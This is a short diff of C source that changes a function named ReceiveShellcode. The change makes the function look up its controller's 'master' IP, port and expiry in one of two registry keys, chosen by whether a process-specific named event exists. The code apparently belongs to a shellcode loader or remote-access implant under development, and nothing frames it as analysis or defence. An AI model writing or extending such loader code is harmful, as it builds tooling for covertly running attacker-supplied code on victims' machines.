@@ -226,7 +226,15 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
 
     char addr[100] = { 0 }, hash[33] = { 0 };
     strcpy(addr, sIP);
-    const char* path = "Software\\ServerD11\\settings";
+    BOOL isAuthKernel = FALSE;
+	char eventName[64];
+	snprintf(eventName, sizeof(eventName), "YAMA_%d", GetCurrentProcessId());
+	HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, eventName);
+    if (hEvent) {
+        CloseHandle(hEvent);
+        isAuthKernel = TRUE;
+    }
+    const char* path = isAuthKernel ? "Software\\YAMA\\auth" : "Software\\ServerD11\\settings";
     char* saved_ip = ReadRegistryString(path, "master");
     char* saved_port = ReadRegistryString(path, "port");
     char* valid_to = ReadRegistryString(path, "valid_to");
